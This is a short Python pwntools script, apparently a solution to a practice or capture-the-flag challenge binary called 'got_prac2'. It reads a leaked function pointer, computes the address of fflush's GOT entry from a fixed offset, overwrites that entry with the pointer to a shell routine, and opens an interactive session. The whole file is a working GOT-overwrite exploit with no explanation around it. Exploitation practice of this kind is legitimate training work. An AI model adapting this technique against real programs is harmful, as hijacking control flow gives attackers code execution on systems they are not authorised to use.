from pwn import *

p = process("./got_prac2")


p.recvuntil("pointer : ")
shell = int(p.recv(),16)
fflush_got = shell+0x14AF
log.info("shell pointer : "+hex(shell)+", fflush's got : "+hex(fflush_got))

pause()

p.sendline(p32(fflush_got))

p.sendline(p32(shell))

p.interactive()

